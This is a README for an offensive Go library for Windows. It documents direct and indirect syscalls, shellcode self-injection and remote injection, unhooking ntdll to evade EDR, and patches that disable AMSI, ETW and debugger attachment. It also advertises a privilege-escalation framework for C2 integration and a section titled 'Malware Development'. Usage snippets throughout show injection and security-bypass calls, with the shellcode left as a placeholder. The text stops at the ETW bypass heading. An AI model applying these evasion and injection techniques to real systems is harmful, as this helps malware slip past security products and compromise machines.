# Windows Native Syscall Library for Go

> **TL;DR:** This Go library provides both direct and indirect syscalls on Windows (via Plan9 asm stubs), along with safe typed wrappers for shellcode injection, memory operations and AMSI/ETW bypass.  
> No `LoadLibrary`, no `GetProcAddress` and no AV-triggering WinAPI calls.  
> *(Unless you explicitly use the `DirectCall` feature to invoke higher-level APIs like `CreateThread`, which still pass through `ntdll` and call `NtCreateThreadEx` internally.)*

## What This Is Not

- Not compatible with `golang.org/x/sys/windows` or Go's native `syscall` package  
- Not a cross-architecture solution.. this library currently supports only 64-bit Windows targets  
- Not a PE or DLL reflective loader, this library focuses on shellcode injection and direct NT syscall execution  
- Not designed for restricted environments where low-level system access is blocked (for example, AppContainers, HVCI, or sandboxed runtimes)

## Table of Contents

- [Features](#features)
- [Demo](#demo)
- [Quick Start](#quick-start)
  - [Installation](#installation)
  - [Basic Usage](#basic-usage)
- [API Reference](#api-reference)
  - [Core Functions](#core-functions)
  - [Indirect Syscall Functions](#indirect-syscall-functions)
  - [Common API Functions](#common-api-functions)
  - [Utility Functions](#utility-functions)
  - [NT Status Code Helpers](#nt-status-code-helpers)
- [Syscall Discovery & Analysis](#syscall-discovery--analysis)
  - [DumpAllSyscalls Feature](#dumpalllsyscalls-feature)
- [Security Bypass Features](#security-bypass-features)
  - [Integration and Usage](#integration-and-usage)
- [Privilege Escalation Features](#privilege-escalation-features)
  - [Overview](#overview)
  - [Discovery Module](#discovery-module-winapi_privescgo)
  - [Exploitation Module](#exploitation-module-winapi_expgo)
  - [Integration with Your Projects](#integration-with-your-projects)
  - [Data Structures](#data-structures)
  - [Important Usage Notes](#important-usage-notes)
- [Build Requirements](#build-requirements)
  - [Prerequisites](#prerequisites)
  - [Build Process](#build-process)
- [How It Works](#how-it-works)
  - [Architecture](#architecture)
  - [Direct Syscall Flow](#direct-syscall-flow)
  - [Assembly Function](#assembly-function)
- [Use Cases](#use-cases)
  - [Security Research](#security-research)
  - [System Programming](#system-programming)
  - [Stealth Operations](#stealth-operations)
- [Using the WinAPI Library](#using-the-winapi-library)
  - [Basic Memory Operations](#basic-memory-operations)
  - [Process Manipulation](#process-manipulation)
  - [Thread Creation and Injection](#thread-creation-and-injection)
  - [Using Raw DirectSyscall for Any API](#using-raw-directsyscall-for-any-api)
  - [Error Handling](#error-handling)
  - [Important Notes](#important-notes)
  - [Common NTSTATUS Values](#common-ntstatus-values)
- [Security Considerations](#security-considerations)
- [Examples](#examples)
- [Testing](#testing)
- [Detection](#detection)
- [Contributing](#contributing)
- [License](#license)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

>currently for whatever reason microsoft is the only vendor that detects the... readme? so you may get a win defender notification when go getting or git cloning, i really don't get it but alright!
##  Features

- **True Direct Syscalls**: Raw `syscall` instructions with manually resolved syscall numbers
- **Indirect Syscalls**: Jump to syscall instructions in ntdll.dll for enhanced stealth and EDR evasion
- **Dual Syscall Methods**: Choose between direct syscalls (raw instructions) or indirect syscalls (ntdll jumps)
- **No API Dependencies**: Bypasses `GetProcAddress`, `LoadLibrary`, and all traditional Windows APIs
- **Pure Go Implementation**: Native Go assembly using Plan9 syntax - no external dependencies
- **Self-Injection Capability**: Built-in shellcode self-injection using NT APIs and CreateThread
- **Dual API Support**: Both direct syscalls (NT APIs) and regular Windows API calls via DirectCall
- **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
- **Obfuscation Support**: Function name hashing for stealth operations
- **Security Bypass**: Built-in AMSI, ETW, and debug protection bypass capabilities  
- **Privilege Escalation Framework**: Comprehensive discovery and exploitation of Windows privilege escalation vectors
- **Automated Vulnerability Scanning**: Identifies binary planting and service exploitation opportunities
- **Structured Exploitation**: Clean library functions for integrating privilege escalation into C2 frameworks
- **Syscall Table Generation**: Automatic Go source file generation with pre-computed syscall numbers
- **Complete ntdll Function Discovery**: Enumerate and call ANY exported function from ntdll.dll (2,400+ functions)
- **Direct ntdll Function Calling**: Call Ldr*, Rtl*, and other ntdll functions without GetProcAddress
- **Dynamic Library Loading**: LdrLoadDll and LdrGetProcedureAddress implementation for stealth DLL operations
- **LOTS of Constants**: All common Windows constants included
- **Type Safety**: Strongly typed function signatures for common APIs

## Demo

![demo2](https://github.com/user-attachments/assets/b78ed66a-0781-47ab-b407-3c5cb4470b39)

## Quick Start

[go docs](https://pkg.go.dev/github.com/carved4/go-native-syscall)

### Installation

```bash
go get github.com/carved4/go-native-syscall
```

### Basic Usage
> best results for shellcode execution come from https://github.com/Binject/go-donut - make your payloads with that :3

**Direct Syscalls**
```go
package main

import (
	"fmt"
	"unsafe"

	winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Unhook mr ntdll
        winapi.UnhookNtdll()

	// Declare shellcode
	shellcode := []byte{/* im a shellcode */}

	// Inject shellcode into current process using direct syscalls
	err := winapi.NtInjectSelfShellcode(shellcode)
	if err != nil {
		fmt.Printf("Direct self-injection failed: %v\n", err)
	} else {
		fmt.Println("Direct self-injection succeeded")
	}
}
```

**Indirect Syscalls**
```go
package main

import (
	"fmt"
	"unsafe"

	winapi "github.com/carved4/go-native-syscall"
)

func main() {
	// Unhook mr ntdll
        winapi.UnhookNtdll()

	// Declare shellcode
	shellcode := []byte{/* im a shellcode */}

	// Inject shellcode into current process using indirect syscalls
	err := winapi.NtInjectSelfShellcodeIndirect(shellcode)
	if err != nil {
		fmt.Printf("Indirect self-injection failed: %v\n", err)
	} else {
		fmt.Println("Indirect self-injection succeeded")
	}
}
```

## API Reference

### Core Functions

#### `DirectSyscall(functionName string, args ...uintptr) (uintptr, error)`
Execute any Windows API function by name using direct syscalls.

```go
// Call any NTDLL function directly
status, err := winapi.DirectSyscall("NtQuerySystemInformation", 
    winapi.SystemBasicInformation,
    uintptr(unsafe.Pointer(&buffer[0])),
    uintptr(len(buffer)),
    uintptr(unsafe.Pointer(&returnLength)),
)
```

#### `DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error)`
Execute syscalls using pre-computed function name hashes for obfuscation.

```go
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
status, err := winapi.DirectSyscallByHash(hash, args...)
```

### Indirect Syscall Functions

The library now provides comprehensive indirect syscall capabilities that jump to syscall instructions in ntdll.dll instead of executing raw syscall instructions. This provides enhanced stealth against EDR products that monitor direct syscall usage.

#### `IndirectSyscall(functionName string, args ...uintptr) (uintptr, error)`
Execute any Windows API function by name using indirect syscalls that jump to ntdll.

```go
// Call any NTDLL function using indirect syscalls
status, err := winapi.IndirectSyscall("NtQuerySystemInformation", 
    winapi.SystemBasicInformation,
    uintptr(unsafe.Pointer(&buffer[0])),
    uintptr(len(buffer)),
    uintptr(unsafe.Pointer(&returnLength)),
)
```

#### `IndirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error)`
Execute indirect syscalls using pre-computed function name hashes for maximum obfuscation.

```go
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
status, err := winapi.IndirectSyscallByHash(hash, args...)
```

#### Complete Indirect API Coverage

All direct syscall functions have corresponding indirect implementations with the "Indirect" suffix:

**Process and Memory Management:**
- `NtAllocateVirtualMemoryIndirect` - Allocate memory using indirect syscalls
- `NtWriteVirtualMemoryIndirect` - Write to process memory via ntdll
- `NtReadVirtualMemoryIndirect` - Read from process memory via ntdll
- `NtProtectVirtualMemoryIndirect` - Change memory protection via ntdll
- `NtFreeVirtualMemoryIndirect` - Free virtual memory via ntdll
- `NtQueryVirtualMemoryIndirect` - Query virtual memory information via ntdll

**Thread and Process Operations:**
- `NtCreateThreadExIndirect` - Create threads using ntdll jumps
- `NtOpenProcessIndirect` - Open process handles via ntdll
- `NtTerminateProcessIndirect` - Terminate processes via ntdll
- `NtSuspendProcessIndirect` - Suspend processes via ntdll
- `NtResumeProcessIndirect` - Resume processes via ntdll
- `NtCreateProcessIndirect` - Create new processes via ntdll

**Thread Management:**
- `NtCreateThreadIndirect` - Create threads via ntdll
- `NtOpenThreadIndirect` - Open thread handles via ntdll
- `NtSuspendThreadIndirect` - Suspend threads via ntdll
- `NtResumeThreadIndirect` - Resume threads via ntdll
- `NtTerminateThreadIndirect` - Terminate threads via ntdll

**File System Operations:**
- `NtCreateFileIndirect` - Create/open files via ntdll
- `NtWriteFileIndirect` - Write to files via ntdll
- `NtReadFileIndirect` - Read from files via ntdll
- `NtDeleteFileIndirect` - Delete files via ntdll
- `NtSetInformationFileIndirect` - Set file information via ntdll
- `NtQueryInformationFileIndirect` - Query file information via ntdll

**Security and Token Operations:**
- `NtOpenProcessTokenIndirect` - Open process tokens via ntdll
- `NtOpenThreadTokenIndirect` - Open thread tokens via ntdll
- `NtQueryInformationTokenIndirect` - Query token information via ntdll
- `NtSetInformationTokenIndirect` - Set token information via ntdll
- `NtAdjustPrivilegesTokenIndirect` - Adjust token privileges via ntdll

**Synchronization Objects:**
- `NtCreateEventIndirect` - Create event objects via ntdll
- `NtOpenEventIndirect` - Open event objects via ntdll
- `NtSetEventIndirect` - Set events to signaled state via ntdll
- `NtResetEventIndirect` - Reset events to non-signaled state via ntdll
- `NtWaitForSingleObjectIndirect` - Wait for single objects via ntdll
- `NtWaitForMultipleObjectsIndirect` - Wait for multiple objects via ntdll

**High-Level Indirect Functions:**
- `NtInjectSelfShellcodeIndirect` - Complete self-injection using only indirect syscalls
- `NtInjectRemoteIndirect` - Complete remote process injection using only indirect syscalls
- `SelfDelIndirect` - Self-deletion using only indirect syscalls

#### Usage Example

```go
package main

import (
	"fmt"
	"unsafe"

	winapi "github.com/carved4/go-native-syscall"
)

func main() {
	// Unhook ntdll first
	winapi.UnhookNtdll()
	
	// Use indirect syscalls for enhanced stealth
	shellcode := []byte{/* your shellcode */}
	
	// Self-injection using indirect syscalls
	err := winapi.NtInjectSelfShellcodeIndirect(shellcode)
	if err != nil {
		fmt.Printf("Indirect self-injection failed: %v\n", err)
	} else {
		fmt.Println("Indirect self-injection succeeded")
	}
	
	// Remote injection using indirect syscalls
	var processHandle uintptr
	// ... open target process ...
	err = winapi.NtInjectRemoteIndirect(processHandle, shellcode)
	if err != nil {
		fmt.Printf("Indirect remote injection failed: %v\n", err)
	} else {
		fmt.Println("Indirect remote injection succeeded")
	}
}
```

### Common API Functions

The library provides strongly-typed wrappers for common Windows APIs:

**Direct Syscall Functions (NT APIs):**
- `NtAllocateVirtualMemory` - Allocate memory in processes
- `NtWriteVirtualMemory` - Write to process memory  
- `NtReadVirtualMemory` - Read from process memory
- `NtProtectVirtualMemory` - Change memory protection
- `NtCreateThreadEx` - Create threads in processes
- `NtOpenProcess` - Open process handles
- `NtQuerySystemInformation` - Query system information
- `NtQueryInformationProcess` - Query process information
- `NtQueryInformationThread` - Query thread information
- `NtSetInformationThread` - Set thread information
- `NtCreateFile` / `NtReadFile` / `NtWriteFile` - File operations
- `NtDeviceIoControlFile` - Perform I/O control operations on files
- `NtClose` - Close handles
- `NtWaitForSingleObject` - Wait for object signals
- `NtQueryVirtualMemory` - Query virtual memory information
- `NtQueryObject` - Query object information
- `NtQueryPerformanceCounter` - Query high-precision performance counter
- `NtFlushInstructionCache` - Flush instruction cache (critical for code injection)
- `NtOpenProcessTokenEx` - Open process access tokens with extended parameters
- `NtOpenThreadTokenEx` - Open thread access tokens with extended parameters
- `NtReleaseSemaphore` - Release semaphore objects
- `NtRemoveIoCompletion` - Remove completed I/O operations from completion ports
- `NtReplyWaitReceivePort` - Wait for and receive messages on ports
- `NtReplyPort` - Send reply messages to ports
- `NtSetEventBoostPriority` - Boost priority of waiting threads

**High-Level Functions:**
- `NtInjectSelfShellcode` - Complete self-injection using direct syscalls with smart memory compatibility layer
- `NtInjectRemote` - Complete remote process injection using direct syscalls
- `SelfDel` - Self-deletion of current executable using NT path format
- `DirectCall` - Call any Windows API function by address
- `UnhookNtdll` - Get a fresh copy of NTDLL from //KnownDlls to restore hooked functions

**Security Bypass Functions:**
- `PatchAMSI` - Disable Anti-Malware Scan Interface
- `PatchETW` - Disable Event Tracing for Windows
- `PatchDbgUiRemoteBreakin` - Prevent remote debugger attachment
- `PatchNtTraceEvent` - Prevent trace event logging
- `PatchNtSystemDebugControl` - Prevent debug control operations
- `ApplyAllPatches` - Apply all security bypass patches at once
- `ApplyCriticalPatches` - Apply only AMSI and ETW patches

### Utility Functions

#### `GetSyscallNumber(functionName string) uint16`
Get the syscall number for debugging purposes.

#### `GetFunctionHash(functionName string) uint32`
Get the hash of a function name for obfuscation.

#### `GuessSyscallNumber(functionName string) uint16`
Attempts to infer a syscall number for a hooked function by finding clean left and right neighbors and interpolating the missing number. This function is particularly useful when functions are hooked and normal syscall resolution fails.

```go
// Example: Guess syscall number for a potentially hooked function
syscallNum := winapi.GuessSyscallNumber("NtAllocateVirtualMemory")
if syscallNum != 0 {
    fmt.Printf("Guessed syscall number: %d\n", syscallNum)
}

// Can also be called directly from syscallresolve package with hash
import "github.com/carved4/go-native-syscall/pkg/syscallresolve"
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
syscallNum := syscallresolve.GuessSyscallNumber(hash)
```

#### `DumpAllSyscalls() ([]SyscallInfo, error)`
Enumerate and dump all available syscalls from ntdll.dll with their syscall numbers, hashes, and addresses.

#### `DumpAllSyscallsWithFiles() ([]SyscallInfo, error)`
Enhanced version that enumerates syscalls and exports to both JSON and Go files. Generates a Go syscall table file for developers.

#### `DumpAllNtdllFunctions() ([]FunctionInfo, error)`
Enumerate ALL exported functions from ntdll.dll (both syscalls and regular functions). This includes Ldr*, Rtl*, Nt*, Zw*, and other ntdll functions - over 2,400 total functions.

#### `FindNtdllFunction(functionName string) (*FunctionInfo, error)`
Search for a specific function in ntdll by name and return its information including address for direct calling.

#### `CallNtdllFunction(functionName string, args ...uintptr) (uintptr, error)`
Call any ntdll function by name using DirectCall. Automatically resolves function address and executes.

#### `GetNtdllFunctionAddress(functionName string) (uintptr, error)`
Get the address of a function in ntdll for repeated calls without lookup overhead.

#### `LdrLoadDll(dllPath string) (uintptr, error)`
Load a DLL using the ntdll LdrLoadDll function - direct call to ntdll without going through kernel32.

#### `LdrGetProcedureAddress(moduleHandle uintptr, functionName string) (uintptr, error)`
Get the address of a function in a loaded module using ntdll - direct call without GetProcAddress.

#### `UnhookNtdll() error`
Restores a fresh copy of ntdll.dll from the `\\KnownDlls` section to bypass hooks installed by EDRs or other security products. This function maps a clean copy of ntdll directly from the Windows system cache, effectively removing any user-mode hooks.

```go
// Restore clean ntdll before performing sensitive operations
err := winapi.UnhookNtdll()
if err != nil {
    fmt.Printf("Failed to unhook ntdll: %v\n", err)
} else {
    fmt.Println("Successfully restored clean ntdll")
}

// Now perform operations with unhooked ntdll
winapi.PrewarmSyscallCache()
err = winapi.NtInjectSelfShellcode(shellcode)
```

**How it works:**
1. Opens `\\KnownDlls\\ntdll.dll` section object (Windows system cache)
2. Maps the clean ntdll into current process memory
3. Copies the clean `.text` section over the hooked version
4. Restores original memory protection
5. All subsequent syscalls use the clean, unhooked functions

### NT Status Code Helpers

The library includes NT status code formatting and validation functions that are used by default throughout the codebase.

#### `FormatNTStatus(status uintptr) string`
Returns a formatted string representation of an NTSTATUS code with both the hex value and human-readable description.

```go
status := uintptr(0xC0000008)
formatted := winapi.FormatNTStatus(status)
// Returns: "0xC0000008 (STATUS_INVALID_HANDLE)"

// Unknown status codes are categorized by severity
unknownStatus := uintptr(0xC0001234)
formatted = winapi.FormatNTStatus(unknownStatus)
// Returns: "0xC0001234 (Unknown ERROR status)"
```

#### `IsNTStatusSuccess(status uintptr) bool`
Checks if an NTSTATUS code indicates success (STATUS_SUCCESS).

#### `IsNTStatusError(status uintptr) bool`
Checks if an NTSTATUS code indicates an error (severity bits = 11).

#### `IsNTStatusWarning(status uintptr) bool`
Checks if an NTSTATUS code indicates a warning (severity bits = 10).

```go
status, err := winapi.NtAllocateVirtualMemory(/* args */)

if winapi.IsNTStatusSuccess(status) {
    fmt.Println("Allocation successful")
} else if winapi.IsNTStatusError(status) {
    fmt.Printf("Allocation failed: %s\n", winapi.FormatNTStatus(status))
}
```

#### Enhanced Error Messages

All syscall operations in the main program now use enhanced NT status code formatting by default. Instead of raw hex values, you'll see descriptive error messages:

**Before:**
```
NtAllocateVirtualMemory failed: 0xc0000008
```

**After:**
```
NtAllocateVirtualMemory failed: 0xC0000008 (STATUS_INVALID_HANDLE)
```

#### Supported Status Codes

The FormatNTStatus function recognizes over 30 common NTSTATUS codes including:
- `STATUS_SUCCESS` (0x00000000)
- `STATUS_INFO_LENGTH_MISMATCH` (0xC0000004)
- `STATUS_INVALID_HANDLE` (0xC0000008)
- `STATUS_INVALID_PARAMETER` (0xC000000D)
- `STATUS_ACCESS_DENIED` (0xC0000022)
- `STATUS_ACCESS_VIOLATION` (0xC0000005)
- `STATUS_NO_MEMORY` (0xC0000017)
- `STATUS_PRIVILEGE_NOT_HELD` (0xC0000061)
- And many more...

## Complete ntdll Function Discovery & Direct Calling

### Overview

The library provides comprehensive access to ALL exported functions from ntdll.dll, not just syscalls. This includes over 2,400 functions across multiple categories:

- **Ldr Functions** (81 functions): LdrLoadDll, LdrGetProcedureAddress, LdrUnloadDll, etc.
- **Rtl Functions** (1000+ functions): RtlGetVersion, RtlCreateHeap, RtlAllocateHeap, etc. 
- **Nt/Zw Syscalls** (942 functions): All direct syscall functions
- **Other ntdll Functions**: Debugging, tracing, and internal Windows functions

### Key Capabilities

#### **Universal Function Discovery**
```go
// Enumerate ALL ntdll functions (syscalls + regular functions)
functions, err := winapi.DumpAllNtdllFunctions()
if err != nil {
    log.Fatal(err)
}

fmt.Printf("Found %d total functions in ntdll\n", len(functions))

// Filter by function type
for _, function := range functions {
    if function.IsSyscall {
        fmt.Printf("Syscall: %s (SSN: %d)\n", function.Name, function.SyscallNumber)
    } else if strings.HasPrefix(function.Name, "Ldr") {
        fmt.Printf("Loader function: %s at 0x%X\n", function.Name, function.Address)
    } else if strings.HasPrefix(function.Name, "Rtl") {
        fmt.Printf("Runtime function: %s at 0x%X\n", function.Name, function.Address)
    }
}
```

#### **Direct Function Calling**
```go
// Call any ntdll function by name - automatic address resolution
result, err := winapi.CallNtdllFunction("RtlGetVersion", 
    uintptr(unsafe.Pointer(&versionInfo)))

// Get function address for repeated calls (performance optimization)
rtlGetVersionAddr, err := winapi.GetNtdllFunctionAddress("RtlGetVersion")
result, err := winapi.DirectCall(rtlGetVersionAddr, 
    uintptr(unsafe.Pointer(&versionInfo)))
```

#### **Stealth DLL Loading**
```go
// Load DLLs without LoadLibrary (bypasses hooks)
moduleHandle, err := winapi.LdrLoadDll("user32.dll")
if err != nil {
    log.Fatal(err)
}

// Get function addresses without GetProcAddress
funcAddr, err := winapi.LdrGetProcedureAddress(moduleHandle, "MessageBoxW")
if err != nil {
    log.Fatal(err)
}

// Call the function directly
result, err := winapi.DirectCall(funcAddr, hwnd, text, caption, type)
```

#### **Complete Workflow Example**
```go
package main

import (
    "fmt"
    "unsafe"
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // 1. Load a DLL using ntdll (no kernel32 dependency)
    moduleHandle, err := winapi.LdrLoadDll("kernel32.dll")
    if err != nil {
        panic(err)
    }
    
    // 2. Get function address using ntdll (no GetProcAddress)
    funcAddr, err := winapi.LdrGetProcedureAddress(moduleHandle, "GetCurrentProcessId")
    if err != nil {
        panic(err)
    }
    
    // 3. Call the function directly
    pid, err := winapi.DirectCall(funcAddr)
    if err != nil {
        panic(err)
    }
    
    fmt.Printf("Current PID: %d\n", pid)
    
    // 4. Also demonstrate calling ntdll functions directly
    type RTL_OSVERSIONINFOW struct {
        dwOSVersionInfoSize uint32
        dwMajorVersion      uint32
        dwMinorVersion      uint32
        dwBuildNumber       uint32
        dwPlatformId        uint32
        szCSDVersion        [128]uint16
    }
    
    versionInfo := RTL_OSVERSIONINFOW{
        dwOSVersionInfoSize: 312,
    }
    
    // Call RtlGetVersion directly from ntdll
    result, err := winapi.CallNtdllFunction("RtlGetVersion", 
        uintptr(unsafe.Pointer(&versionInfo)))
    
    if err == nil && result == 0 {
        fmt.Printf("Windows Version: %d.%d.%d\n", 
            versionInfo.dwMajorVersion,
            versionInfo.dwMinorVersion, 
            versionInfo.dwBuildNumber)
    }
}
```

### FunctionInfo Structure

The `FunctionInfo` struct provides complete metadata about ntdll functions:

```go
type FunctionInfo struct {
    Name          string  // Function name (e.g., "LdrLoadDll")
    Hash          uint32  // Obfuscated hash of the name
    Address       uintptr // Memory address of the function
    IsSyscall     bool    // True if this is a syscall function
    SyscallNumber uint16  // Syscall number (only valid if IsSyscall is true)
}
```

### Performance Optimizations

#### **Function Address Caching**
```go
// Cache function addresses for repeated calls
var (
    ldrLoadDllAddr    uintptr
    ldrGetProcAddr    uintptr
    rtlGetVersionAddr uintptr
)

func init() {
    // Resolve addresses once at startup
    ldrLoadDllAddr, _ = winapi.GetNtdllFunctionAddress("LdrLoadDll")
    ldrGetProcAddr, _ = winapi.GetNtdllFunctionAddress("LdrGetProcedureAddress")
    rtlGetVersionAddr, _ = winapi.GetNtdllFunctionAddress("RtlGetVersion")
}

func FastCall() {
    // Use cached addresses for maximum performance
    winapi.DirectCall(rtlGetVersionAddr, args...)
}
```

#### **Batch Function Discovery**
```go
// Get multiple functions at once
functions, err := winapi.DumpAllNtdllFunctions()
functionMap := make(map[string]uintptr)

for _, function := range functions {
    functionMap[function.Name] = function.Address
}

// Now all function addresses are available instantly
addr := functionMap["LdrLoadDll"]
winapi.DirectCall(addr, args...)
```

### Security & Evasion Benefits

#### **API Hook Bypass**
- **No LoadLibrary**: Uses LdrLoadDll directly from ntdll
- **No GetProcAddress**: Uses LdrGetProcedureAddress directly from ntdll  
- **Direct Calls**: Bypasses common API hooks in kernel32.dll
- **Function Obfuscation**: Uses hashed function names for stealth

#### **Detection Evasion**
- **Low-Level Access**: Operates at the ntdll level, below most monitoring
- **No Import Dependencies**: Doesn't import hooked functions
- **Runtime Resolution**: Function addresses resolved at runtime, not in import table
- **Diverse Function Access**: Can call any of 2,400+ ntdll functions

### Use Cases

#### **Malware Development**
- Load additional DLLs without detection
- Access Windows internals through Rtl functions
- Bypass API monitoring and sandboxes
- Implement custom loaders and injectors

#### **Security Research** 
- Explore the complete Windows API surface
- Test hook bypasses and evasion techniques
- Analyze Windows internal functions
- Reverse engineer Windows components

#### **System Administration**
- Access low-level Windows functionality
- Implement efficient system monitoring
- Create custom diagnostic tools
- Build performance-optimized applications

## Syscall Discovery & Analysis

###  DumpAllSyscalls Feature

The library includes a powerful syscall enumeration feature that can discover and analyze all available Windows syscalls on the current system. This is invaluable for research, debugging, and understanding the Windows API landscape.

#### Command Line Usage

```bash
# Dump all syscalls to console, JSON file and go stub
# Also demonstrates NT status code formatting examples
./go-native-syscall.exe -dump

# Scan for privilege escalation vectors and test exploitation
# Also demonstrates privilege escalation framework
./go-native-syscall.exe -privesc
```

#### Console Output
```
Starting syscall enumeration...
Successfully got PEB at 0x8DFAD6000, Ldr at 0x7FF87D45C4C0
Found module: go-native-syscall.exe (base: 0x7FF719D70000)
Found module: ntdll.dll (base: 0x7FF87D2F0000)
Hash match for ntdll.dll! Hash: 0x1EDAB0ED
Found ntdll.dll at: 0x7FF87D2F0000
PE SizeOfImage: 2064384 bytes
Found 2435 exports in ntdll.dll
Found 942 syscall functions:

SSN  Function Name                            Hash         Address
---- ---------------------------------------- ------------ ----------------
1    ZwWorkerFactoryWorkerReady               0x1F4EFAF7   0x7FF87D38D500
1    NtWorkerFactoryWorkerReady               0xE5659C68   0x7FF87D38D500
2    ZwAcceptConnectPort                      0x59025CF5   0x7FF87D38D520
2    NtAcceptConnectPort                      0x44832B86   0x7FF87D38D520
3    ZwMapUserPhysicalPagesScatter            0xEEA7A3F6   0x7FF87D38D540
3    NtMapUserPhysicalPagesScatter            0x5D849BC7   0x7FF87D38D540
```

#### JSON Export Structure

The dump automatically generates a timestamped JSON file with complete syscall information:

```json
{
  "timestamp": "2025-06-06T12:20:11-04:00",
  "system_info": {
    "os": "Windows",
    "architecture": "x64",
    "ntdll_base": "0x7FF87D380000"
  },
  "syscalls": [
    {
      "Name": "ZwWorkerFactoryWorkerReady",
      "Hash": 525269751,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "NtWorkerFactoryWorkerReady",
      "Hash": 3848641640,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "ZwAcceptConnectPort",
      "Hash": 1493327093,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "NtAcceptConnectPort",
      "Hash": 1149447046,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "ZwMapUserPhysicalPagesScatter",
      "Hash": 4003963894,
      "SyscallNumber": 3,
      "Address": 140705229493568
    },
```

#### Using DumpAllSyscalls Programmatically

```go
package main

import (
    "fmt"
    "log"
    
    winapi "github.com/carved4/go-native-syscall"
)

func main() {
    // Dump all syscalls
    syscalls, err := winapi.DumpAllSyscalls()
    if err != nil {
        log.Fatal("Failed to dump syscalls:", err)
    }
    
    fmt.Printf("Found %d syscalls\n", len(syscalls))
    
    // Find specific syscalls
    for _, sc := range syscalls {
        if sc.Name == "NtAllocateVirtualMemory" {
            fmt.Printf("Found NtAllocateVirtualMemory:\n")
            fmt.Printf("  SSN: %d\n", sc.SyscallNumber)
            fmt.Printf("  Hash: 0x%X\n", sc.Hash)
            fmt.Printf("  Address: 0x%X\n", sc.Address)
        }
    }
}
```

#### Key Features

- **Complete Discovery**: Finds all Nt*/Zw* syscall functions in ntdll.dll
- **Rich Metadata**: Syscall numbers, function hashes, and memory addresses
- **Persistent Storage**: Automatic JSON export with timestamps
- **Duplicate Detection**: Shows Nt*/Zw* function pairs with same syscall numbers
- **Analysis Ready**: Structured data perfect for research and automation
- **Research Friendly**: Includes system context and metadata

#### Use Cases

**Security Research**
- Map the complete Windows syscall landscape
- Track syscall changes across Windows versions
- Identify new or modified syscalls in updates

**Malware Analysis**
- Understand available syscalls for evasion techniques
- Pre-compute function hashes for obfuscation
- Analyze syscall usage patterns

**System Administration**
- Audit available system calls
- Compare syscalls across different systems
- Generate reference documentation

**Development & Debugging**
- Verify syscall resolution is working correctly
- Debug hash collisions or resolution issues
- Understand the true Windows API surface

#### Go Syscall Table Generation

This creates two files:
- `syscall_dump_YYYYMMDD_HHMMSS.json` - Complete syscall information
- `syscall_table_YYYYMMDD_HHMMSS.go` - Go package with syscall number map

#### Generated Go File Structure

```go
// Package syscalltable provides pre-computed syscall numbers
// Auto-generated by go-native-syscall DumpAllSyscalls function
// WARNING: These syscall numbers are specific to this Windows version
package syscalltable

// SyscallTable contains pre-computed syscall numbers for Windows NT functions
// Key: Function name, Value: Syscall number (SSN)
var SyscallTable = map[string]uint16{
    "NtAcceptConnectPort": 2,
    "NtAllocateVirtualMemory": 24,
    "NtClose": 15,
    "NtCreateFile": 85,
    "NtCreateProcess": 166,
    "NtCreateThread": 169,
    "NtCreateThreadEx": 195,
    // ... hundreds more syscalls
}

// GetSyscallNumber returns the syscall number for a given function name
func GetSyscallNumber(functionName string) uint16 {
    if ssn, exists := SyscallTable[functionName]; exists {
        return ssn
    }
    return 0
}

// GetAllSyscalls returns a copy of the complete syscall table
func GetAllSyscalls() map[string]uint16 { /* ... */ }

// GetSyscallCount returns the total number of syscalls in the table
func GetSyscallCount() int { /* ... */ }
```

#### Using Generated Syscall Table

Developers can use the generated syscall table for static syscall number lookup:

```go
import "./syscalltable" // Import generated package

func main() {
    // Look up syscall numbers without runtime resolution
    allocSSN := syscalltable.GetSyscallNumber("NtAllocateVirtualMemory")
    writeSSN := syscalltable.GetSyscallNumber("NtWriteVirtualMemory")
    
    fmt.Printf("NtAllocateVirtualMemory SSN: %d\n", allocSSN)
    fmt.Printf("NtWriteVirtualMemory SSN: %d\n", writeSSN)
    
    // Get all syscalls for analysis
    allSyscalls := syscalltable.GetAllSyscalls()
    fmt.Printf("Total syscalls: %d\n", len(allSyscalls))
}
```

**Benefits:**
- **Performance**: No runtime PE parsing or hash resolution
- **Reliability**: Pre-computed values reduce runtime dependencies
- **Analysis**: Easy to analyze syscall patterns and ranges
- **Portability**: Can be embedded in other projects

**Important Notes:**
- Syscall numbers are Windows version-specific
- Generated table prefers Nt functions over Zw equivalents
- Functions are automatically sorted alphabetically
- Only includes functions with valid syscall stubs

## Security Bypass Features

The library includes comprehensive security bypass capabilities that can disable common Windows security mechanisms before performing operations. These features use direct syscalls and manual function resolution to avoid detection.

### Available Security Patches

>NOTE: USING APPLYALL ON SELF INJECTION WILL CAUSE SEGFAULT FOR REASONS UNBEKNOWNST TO ME

The library provides five different security bypass functions:

1. **PatchAMSI** - Disables Anti-Malware Scan Interface
2. **PatchETW** - Disables Event Tracing for Windows
3. **PatchDbgUiRemoteBreakin** - Prevents remote debugger attachment
4. **PatchNtTraceEvent** - Prevents trace event logging
5. **PatchNtSystemDebugControl** - Prevents debug control operations

### AMSI Bypass

**Anti-Malware Scan Interface (AMSI)** is a Windows security feature that allows applications and services to integrate with any anti-malware product. The library provides `PatchAMSI()` function to disable AMSI scanning.

#### How it Works

1. **Dynamic Loading Detection**: Uses PEB walking to locate `amsi.dll` if loaded
2. **Function Resolution**: Finds `AmsiScanBuffer` using manual PE parsing
3. **Memory Patching**: Changes protection and overwrites with `xor eax, eax; ret` instruction
4. **Protection Restoration**: Restores original memory protection

#### Usage

```go
// Patch AMSI before performing operations that might trigger scanning
err := winapi.PatchAMSI()
if err != nil {
    // Handle error - amsi.dll might not be loaded
    fmt.Printf("AMSI patch failed: %v\n", err)
}
```

#### Expected Behavior

- **Success**: AMSI scanning is disabled for the current process
- **Failure**: Usually indicates `amsi.dll` is not loaded (normal for many processes)
- **No Side Effects**: Only affects the current process

### ETW Bypass

